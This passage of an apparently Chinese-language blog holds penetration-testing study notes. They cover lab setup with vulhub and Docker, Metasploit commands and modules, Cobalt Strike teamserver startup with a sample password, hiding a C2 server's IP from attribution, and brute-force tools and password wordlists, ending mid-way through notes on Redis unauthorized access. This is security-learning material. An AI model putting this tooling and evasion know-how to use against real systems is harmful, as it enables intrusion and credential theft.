class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install -y wget build-essential libreadline-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev libffi-dev zlib1g-dev<br><br></code></pre></td></tr></table></figure><p>下载python安装包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建文件夹</span><br>cd /root<br>mkdir /usr/local/python3.8<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装python并解压</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果这里很慢的话可以换源</span><br>wget https://www.python.org/ftp/python/3.8.17/Python-3.8.17.tgz<br>tar -zxf Python-3.8.17.tgz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入解压文件夹，安装python</span><br>cd Python-3.8.17<br>./configure --enable-optimizations --prefix=/usr/local/python3.8/ &amp;&amp; make &amp;&amp; make install<br><span class="hljs-meta prompt_"># </span><span class="language-bash">编译的时候我们不能操作</span><br></code></pre></td></tr></table></figure><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><h3 id="VMware虚拟网络编辑"><a href="#VMware虚拟网络编辑" class="headerlink" title="VMware虚拟网络编辑"></a>VMware虚拟网络编辑</h3><h4 id="nat模式"><a href="#nat模式" class="headerlink" title="nat模式"></a>nat模式</h4><ol><li><p>模式简绍</p><p>nat就是通过宿主机上网交换数据，此时不会占用宿主机网络的IP地址</p></li></ol><h4 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h4><ol><li><p>模式简绍</p><p>桥接模式，相当于将物理机作为一个交换机，所有使用桥接的虚拟机都是连接在这个交换机，宿主机也是</p></li></ol><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h4 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h4><ol><li><p>列出所有的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker image ls<br></code></pre></td></tr></table></figure></li><li><p>拉去镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker image pull name<br></code></pre></td></tr></table></figure></li><li><p>删除镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker image rm name/id<br></code></pre></td></tr></table></figure></li></ol><h3 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure><p>需要哪一个靶场就进入到对应的文件夹后使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up -d<br></code></pre></td></tr></table></figure><h3 id="vulnapp"><a href="#vulnapp" class="headerlink" title="vulnapp"></a>vulnapp</h3><ol><li><p>打开服务器</p><blockquote><p>  <a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a>  </p></blockquote></li><li><p>查看对应的漏洞文件，然后看docker 指令</p></li></ol><h3 id="Vulfocus"><a href="#Vulfocus" class="headerlink" title="Vulfocus"></a>Vulfocus</h3><ol><li><p>通过docker 拉取镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull vulfocus/vulfocus:latest<br></code></pre></td></tr></table></figure></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试框架</title>
    <link href="/2023/09/01/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/09/01/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试框架"><a href="#渗透测试框架" class="headerlink" title="渗透测试框架"></a>渗透测试框架</h1><h2 id="Metasploit渗透框架"><a href="#Metasploit渗透框架" class="headerlink" title="Metasploit渗透框架"></a>Metasploit渗透框架</h2><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><blockquote><p>POC: 用于证明漏洞是否存在，是<strong>没有攻击性</strong></p></blockquote><blockquote><p>EXP: <strong>Expoit</strong>，利用漏洞的攻击动作，方式，方法，<strong>具有攻击性</strong></p></blockquote><blockquote><p>PAYLOAD : 有效载荷，真正在系统进行的代码和指令</p></blockquote><blockquote><p>SHELLCODE： 利用漏洞执行的代码</p></blockquote><blockquote><p> CLIENT: 客户端</p></blockquote><blockquote><p>Team Server：服务端，C2服务器，Beacon Payload的控制器</p></blockquote><blockquote><p>Beacon：是Cobalt Strike运行在目标主机上的 payload，Beacon 在隐蔽信道上我们提供服务，用于长期控制受感染主机。</p></blockquote><blockquote><p>C2：Command &amp; Control Server的简称，也就是命令与控制服务器</p></blockquote><h3 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h3><p>The Metasploit Framework 的简称。MSF 高度模块化，即框架由多个 module 组成，是全球最受欢迎的渗透测试工具之一是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的 shellcode，并持续保持更新。metasploit 涵盖了渗透测试中全过程，你可以在这个框架下利用现有的 Payload 进行一系列的渗透测试。</p><h3 id="MSF框架结构"><a href="#MSF框架结构" class="headerlink" title="MSF框架结构"></a>MSF框架结构</h3><p>kali-metasploit框架目录路径</p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p></blockquote><blockquote><p>data: 包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件。</p></blockquote><blockquote><p>documentation：包含框架的可用文档。</p></blockquote><blockquote><p>lib：metasploit的库文件夹。</p></blockquote><blockquote><p>plugins：用来存放metasploit的插件。</p></blockquote><blockquote><p>scripts：用来存放metasploit的脚本，包括meterpreter及其它脚本。</p></blockquote><blockquote><p>tools：存放多种的命令行实用程序。</p></blockquote><blockquote><p>modules：存储metasploit的模块文件。</p></blockquote><p>更新</p><p>但是一般安装最新版的kali一般都是最新版的metasploit</p><blockquote><p>msfconsole -v # 查看版本</p><p>apt-get update</p><p>apt-get install metasploit-framework</p></blockquote><h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><p>Metasploit支持使用数据库来保存渗透测试过程中获取的各种数据</p><ol><li><p>开启数据库</p><blockquote><p>serveice postgresql start</p></blockquote></li><li><p>初始化MSD数据库</p><blockquote><p>msfdb init</p></blockquote><blockquote><p>创建数据库用户：msf</p><p>创建数据库：msf</p><p>创建数据库：msf_test</p><p>创建配置文件：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;config&#x2F;database.yml</p><p>创建保存MSF框架信息所需数据表</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901141403479.png" alt="image-20230901141403479"></p></li></ol><h3 id="启动msfconsole"><a href="#启动msfconsole" class="headerlink" title="启动msfconsole"></a>启动msfconsole</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br></code></pre></td></tr></table></figure><p>Msfconsole 是 Metasploit 框架用户接口，我们能通过 Msfconsole 接口使用 Metasploit 中所有模块</p><p>msfconsole作用</p><ol><li><p>管理Metasploit数据库</p></li><li><p>管理会话</p></li><li><p>配置启动Metasploit模块</p></li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901142007898.png" alt="image-20230901142007898"></p><p>启动msfconsole时，MSF会使用创建MSF用户子哦对那个登录到数据库</p><p>通过db_status检查数据库的状态</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901142212998.png" alt="image-20230901142212998"></p><p>连接其他的数据库</p><blockquote><p>msf5 &gt; db_connect 用户名:口令**@<strong>服务器地址</strong>:<strong>端口</strong>&#x2F;**数据库名称</p></blockquote><h3 id="msf命令"><a href="#msf命令" class="headerlink" title="msf命令"></a>msf命令</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><blockquote><p><strong>show</strong> exploits – 查看所有可用的渗透攻击程序代码</p><p><strong>show</strong> auxiliary – 查看所有可用的辅助攻击工具</p><p>[<strong>show</strong> ]<strong>options</strong>&#x2F;advanced – 查看该模块可用选项</p><p><strong>show</strong> payloads – 查看该模块适用的所有载荷代码</p><p><strong>show</strong> targets – 查看该模块适用的攻击目标类型</p><p><strong>search</strong> – 根据关键字搜索某模块</p><p><strong>info</strong> – 显示某模块的详细信息</p><p>use – 使用某渗透攻击模块</p><p>back – 回退</p><p><strong>set</strong>&#x2F;unset – 设置&#x2F;禁用模块中的某个参数</p><p>setg&#x2F;unsetg – 设置&#x2F;禁用适用于所有模块的全局参数</p></blockquote><h4 id="数据库管理命令"><a href="#数据库管理命令" class="headerlink" title="数据库管理命令"></a>数据库管理命令</h4><blockquote><p>msfdb init                <strong>#</strong> 启动并初始化数据库</p><p>msfdb reinit             <strong>#</strong> 删除并重新初始化数据库</p><p>msfdb <strong>delete</strong>          #** 删除并停止使用数据库</p><p>msfdb start             <strong>#</strong> 启动数据库</p><p>msfdb <strong>stop</strong>             <strong>#</strong> 停止数据库</p><p>msfdb status           <strong>#</strong> 检查服务状态</p><p><strong>msfdb run</strong>               <strong>#</strong> 启动数据库并运行<strong>msfconsole</strong></p></blockquote><h4 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h4><blockquote><p>?             帮助菜单<br>banner        显示  Metasploit banner信息<br><strong>cd</strong>            更改当前工作目录<br>color         切换颜色<br>connect       与主机通信<br><strong>debug</strong>         显示对调试有用的信息<br><strong>exit</strong>          退出控制台<br>features      显示可以选择加入的尚未发布的功能列表<br><strong>get</strong>           获取特定变量的值<br>getg          获取全局变量的值<br><strong>grep</strong>          筛选以一条命令的输出<br><strong>help</strong>          帮助菜单<br><strong>history</strong>       显示命令历史记录<br>load          加载框架插件<br><strong>quit</strong>          退出控制台<br><strong>repeat</strong>        重复一个命令列表<br>route         通过一个session会话路由流量<br>save          保存活动的数据存储<br>sessions      导出会话列表并显示会话信息<br><strong>set</strong>           将一个特定环境的变量设置为一个值<br><strong>setg</strong>          将一个全局变量设置为一个值<br><strong>sleep</strong>         在指定的秒数内不执行任何操作<br>spool         将控制台输出写入文件以及屏幕<br>threads       查看和操作后台线程<br>tips          显示有用的提示清单<br>unload        卸载框架插件<br>unset         取消设置的一个或多个变量<br>unsetg        取消设置一个或多个全局变量<br><strong>version</strong>       显示框架和控制台库版本号</p></blockquote><h4 id="模块命令"><a href="#模块命令" class="headerlink" title="模块命令"></a>模块命令</h4><blockquote><p>advanced      显示一个或多个模块的高级选项<br>back          从当前环境返回<br>clearm        清除模块堆栈<br>favorite      将模块添加到最喜欢的模块列表中<br><strong>info</strong>          显示一个或多个模块的详细信息<br>listm         列表中的模块栈<br>loadpath      从路径中搜索并加载模块<br><strong>options</strong>       显示一个或多个模块全局选项<br>popm          将最新的模块从堆栈中弹出并使其处于活动状态<br>previous      将之前加载的模块设置为当前模块 pushm         将活动模块或模块列表推送到模块堆栈 reload_all    重新加载所有模块<br><strong>search</strong>        搜索模块名称和描述<br><strong>show</strong>          显示给定类型的的模块或所有模块<br>use           通过名称或搜索词&#x2F;索引选择使用模块</p></blockquote><h4 id="作业命令"><a href="#作业命令" class="headerlink" title="作业命令"></a>作业命令</h4><blockquote><p>handler       启动一个payload处理程序作为job </p><p>jobs          显示和管理  jobs</p><p>kill          杀掉一个job </p><p>rename_job    重命名一个job</p></blockquote><h4 id="开发者命令"><a href="#开发者命令" class="headerlink" title="开发者命令"></a>开发者命令</h4><blockquote><p>edit          用首选编辑器编辑当前模块或文件<br>irb           在当前环境下打开一个交互式Ruby shell<br>log           如果可能的话，将framework.log分页显示到最后。<br>pry           在当前模块或框架上打开  Pry 调试器<br>reload_lib    从指定路径重新加载Ruby库文件<br>time          运行一个特定命令所需的时间</p></blockquote><h4 id="攻击载荷命令"><a href="#攻击载荷命令" class="headerlink" title="攻击载荷命令"></a>攻击载荷命令</h4><blockquote><p>check         检查一个目标是否易受攻击<br>generate      生成一个有效载荷<br>reload        从磁盘重新加载当前的模块<br>to_handler    用指定的有效载荷创建一个处理程序</p></blockquote><h3 id="MSF模块简绍"><a href="#MSF模块简绍" class="headerlink" title="MSF模块简绍"></a>MSF模块简绍</h3><blockquote><p>模块是通过Metasploit框架装载集成对外提供的最核心的渗透测试功能实现代码。MSF所有的漏洞测试都是基于模块。</p></blockquote><p>一共有以下7种模块</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901143836927.png" alt="image-20230901143836927"></p><ol><li><p>辅助模块（<strong>Auxiliary</strong>）</p><p>例如针对各种网络服务的<strong>扫描与查点</strong>、<strong>网络扫描</strong>、<strong>枚举</strong>、<strong>漏洞扫描</strong>、<strong>登录口令暴力破解</strong>、<strong>模糊测试</strong>、<strong>爬虫遍历</strong>、<strong>数据提取</strong>等</p><p>此外，辅助模块中还包括一些<strong>无须加</strong>载攻击载荷，同时往往不是取得目标系统远程控制权的渗透攻击，例如：拒绝服务攻击。</p></li><li><p>渗透攻击模块（<strong>Exploits</strong>）</p><p>就是用于攻击的模块</p><p>有远程漏洞利用、本地漏洞利用、权限提升漏洞利用、客户端漏洞利用、Web 应用程序漏洞利用和许多其他漏洞。</p></li><li><p>攻击载荷模块（<strong>Payloads</strong>）</p><p>用于在利用期间执行操作的模块。攻击载荷是在渗透攻击成功后在目标系统运行的一段植入代码，通常是为渗透攻击者打开在目标系统上的控制会话连接。在传统的渗透代码开发中，攻击载荷只是一段功能简单的ShellCode代码，以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码，在渗透攻击触发漏洞后，将程序执行流程劫持并跳转入这段机器代码中执行，从而完成ShellCode中实现的单一功能。</p><p>例如<strong>建立 Meterpreter 会话、反向 shell、执行命令、下载和执行程序</strong>等。</p></li><li><p>后渗透攻击模块（<strong>Post</strong>）</p><p>用于在拿到权限后进行后渗透利用操作的模块，例如凭证&#x2F;哈希转储、本地权限提升、后门安装、敏感数据提取、网络流量隧道（代理）、键盘记录、屏幕捕获和许多其他操作。</p></li><li><p>空指令模块(<strong>Nops</strong>)</p><p>用于生成无害、良性的“无操作”指令的模块，例如用于填充目的、在利用期间在内存中滑动等。用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，从而提高渗透攻击的可靠性。</p><p>可以理解为这个是提高成功的保险</p></li><li><p>编码模块(<strong>Encoders</strong>)</p><p>用于有效负载编码和加密的模块，例如 base64、XOR、shikata_ga_nai 等。这有助于混淆以规避防病毒或 NIDS（网络入侵检测系统）、EDR（端点检测和响应）等防御。</p></li><li><p>规避模块(<strong>Evasions</strong>)</p><p>用于规避防御的模块，例如防病毒规避、AppLocker 绕过、软件限制策略 (SRP) 绕过等。</p><blockquote><p>搜索MSF常见的模块以及详细的使用方法</p><p><a href="https://www.infosecmatter.com/metasploit-module-library/">https://www.infosecmatter.com/metasploit-module-library/</a></p></blockquote></li></ol><h3 id="MSF辅助扫描"><a href="#MSF辅助扫描" class="headerlink" title="MSF辅助扫描"></a>MSF辅助扫描</h3><ol><li><p>MSF主机发现</p><p>模块发现</p><blockquote><p>modules&#x2F;auxiliary&#x2F;scanner&#x2F;discovery&#x2F;</p></blockquote><p>也可以通过search进行搜索模块</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/Metasploit%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901151108175.png" alt="image-20230901151108175"></p><p>arp_sweep：使用arp请求枚举本地局域网中的所有活跃主机</p><p>udp_sweep：通过发送UDP数据包探查指定主机是否活跃，并发现主机上的udp服务。</p><p>模块使用</p><ul><li><p>arp_sweep模块使用</p><blockquote><p>use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep</p><p>set RHOSTS 10.10.10.0&#x2F;24</p><p>set THREADS 50</p><p>run</p></blockquote><p>设置好过后，代表进行启动</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230901183217283.png" alt="image-20230901183217283"></p></li></ul></li></ol><h2 id="CobaltStrike渗透框架"><a href="#CobaltStrike渗透框架" class="headerlink" title="CobaltStrike渗透框架"></a>CobaltStrike渗透框架</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>这个是基于matasploit二次开发的框架</p><p>Cobalt Strike（简称为CS）是一款团队作战渗透神器，是一种可以用来进行横向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端，一个服务端也可以对应多个客户端连接。</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p><a href="https://study.yijinglab.com/mw/289192ed7899c0dbc3f8e19e1d6084f4/class/download-file/temp-url/bcdf0075-a37c-4cd1-b9e0-a5427a514e54?_=%22BAE3A23BBBCB7032A4B9A5C0327D06EB-14%22&filePath=22-CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/cs4.7-cn.zip">下载链接</a></p><p>这个是中文版</p><h4 id="启动服务端"><a href="#启动服务端" class="headerlink" title="启动服务端"></a>启动服务端</h4><ol><li><p>进入到文件夹过后，进行一下的操作</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902151141018.png" alt="image-20230902151141018"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902151153763.png" alt="image-20230902151153763"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902151825591.png" alt="image-20230902151825591"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ./teamserver 192.168.13.114 0804chgCHG<br>IP  密码<br></code></pre></td></tr></table></figure></li></ol><h4 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152315988.png" alt="image-20230902152315988"></p><h5 id="win"><a href="#win" class="headerlink" title="win"></a>win</h5><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152002463.png" alt="image-20230902152002463"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152024051.png" alt="image-20230902152024051"></p><p>完成基本的配置，注意主机是服务端的地址，用户的名称不能重复</p><h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><p>linux必须是在有图形界面的才能正常的运行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152238766.png" alt="image-20230902152238766"></p><p>这里需要等一下</p><h4 id="英文版的翻译"><a href="#英文版的翻译" class="headerlink" title="英文版的翻译"></a>英文版的翻译</h4><p>下面 是旧版的cs，我们使用的是新版的cs</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152348898.png" alt="image-20230902152348898"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152439650.png" alt="image-20230902152439650"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20230902152557225.png" alt="image-20230902152557225"></p><h3 id="Attacks菜单"><a href="#Attacks菜单" class="headerlink" title="Attacks菜单"></a>Attacks菜单</h3><h2 id="渗透测试框架之流量隐藏"><a href="#渗透测试框架之流量隐藏" class="headerlink" title="渗透测试框架之流量隐藏"></a>渗透测试框架之流量隐藏</h2><h3 id="域名上线隐藏IP"><a href="#域名上线隐藏IP" class="headerlink" title="域名上线隐藏IP"></a>域名上线隐藏IP</h3><ol><li><p>为什么要隐藏IP</p><p>  在使用MSF或者CS获得目标机Sessions或者Beacon时，如果直接使用自己的VPS作为MSF或CS的服务器时，容易被溯源到攻击者所在VPS主机IP。</p></li><li><p>CDN简介</p><p>就是加速用户访问网站的速度</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞攻击利用</title>
    <link href="/2023/08/26/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/"/>
    <url>/2023/08/26/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞攻击利用"><a href="#漏洞攻击利用" class="headerlink" title="漏洞攻击利用"></a>漏洞攻击利用</h1><h2 id="弱口令密码破解"><a href="#弱口令密码破解" class="headerlink" title="弱口令密码破解"></a>弱口令密码破解</h2><h3 id="弱密码破解方法"><a href="#弱密码破解方法" class="headerlink" title="弱密码破解方法"></a>弱密码破解方法</h3><ol><li><p>密码破解方法简绍</p><p>  指用枚举的方式来爆破用户信息。具体的流程是用事先收集好的数据集成一个字典，然后用字典不断  进行枚举，直到枚举成功  </p></li><li><p>暴力破解工具</p><p>  BurpSuite  （使用的反应，成功与否的大小反应不一样）</p><p>  Hydra  </p><p>  Metasploit  </p><p>SNETCracker：<a href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></p></li><li><p>暴力破解的字典</p><p>  <code>Default Password  </code></p><p>历年弱口令的top100，github上搜索弱口令字典</p><blockquote><p>  <a href="https://github.com/k8gege/PasswordDic">https://github.com/k8gege/PasswordDic</a>  </p><p>  <a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>  </p><p>  <a href="https://192-168-1-1ip.mobi/default-router-passwords-list/">https://192-168-1-1ip.mobi/default-router-passwords-list/</a>  <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/def">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/def</a>  ault-passwords.csv  </p><p><a href="https://github.com/Dormidera/WordList-Compendium">https://github.com/Dormidera/WordList-Compendium</a></p></blockquote><p>创建自定义字典</p><p>参考网上的软件，下面拿出一个简绍</p><p>pydictor</p><p>  <a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p></li></ol><h3 id="暴力破解的场景"><a href="#暴力破解的场景" class="headerlink" title="暴力破解的场景"></a>暴力破解的场景</h3><ol><li><p>不含验证码的后台</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%BC%B1%E5%AF%86%E7%A0%81/image-20230826174924165-16930433646201.png" alt="image-20230826174924165"></p></li><li><p>不失效的验证码</p></li></ol><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%BC%B1%E5%AF%86%E7%A0%81/image-20230826175012568.png" alt="image-20230826175012568"></p><pre><code class="hljs"> 各种常见应用程序，比如：**phpmyadmin、tomcat、mysql**   各种协议：FTP、SSH、RDP等   爆破大马 </code></pre><h3 id="爆破方法"><a href="#爆破方法" class="headerlink" title="爆破方法"></a>爆破方法</h3><ol><li><p>BP抓包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%BC%B1%E5%AF%86%E7%A0%81/image-20230826175945632.png" alt="image-20230826175945632"></p></li></ol><h2 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h2><p>没有权限却可以访问</p><p>导致其他用户可以无需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露</p><h3 id="常见的未授权的漏洞"><a href="#常见的未授权的漏洞" class="headerlink" title="常见的未授权的漏洞"></a>常见的未授权的漏洞</h3><blockquote><p><strong>Redis</strong>  未授权访问漏洞  </p><p>Docker 未授权访问漏洞  </p><p>MongoDB 未授权访问漏洞  </p><p>Jenkins未授权访问漏洞  </p><p>Memcached 未授权访问漏洞  </p><p>JBOSS 未授权访问漏洞  </p><p>VNC 未授权访问漏洞  </p><p>ZooKeeper 未授权访问漏洞  </p><p>Rsync 未授权访问漏洞  </p><p>Atlassian Crowd 未授权访问漏洞  </p><p>CouchDB 未授权访问漏洞  </p><p>Elasticsearch 未授权访问漏洞  </p><p><strong>Hadoop</strong> 未授权访问漏洞  </p><p>Jupyter Notebook 未授权访问漏洞</p></blockquote><h3 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h3><ol><li><p>redis简介</p><p>  Redis 是完全开源免费的，一个灵活的高性能 key-value 数据结构存储，可以用来作为数据库、缓存  和消息队列。</p></li><li><p>redisd的框架</p><p>  Redis 主要由有两个程序组成：  </p><p>  Redis 客户端 redis-cli  </p><p>  Redis 服务器 redis-server  </p></li><li><p>应用场景</p><ul><li>存储 缓存数据</li><li>需要高速读写的场合使用它高速读写</li></ul></li><li><p>漏洞发现</p><p>redis默认监听端口是6379</p><blockquote><p>MongoDB：27017 </p><p>Memcached：11211  </p><p>Jboss：8080  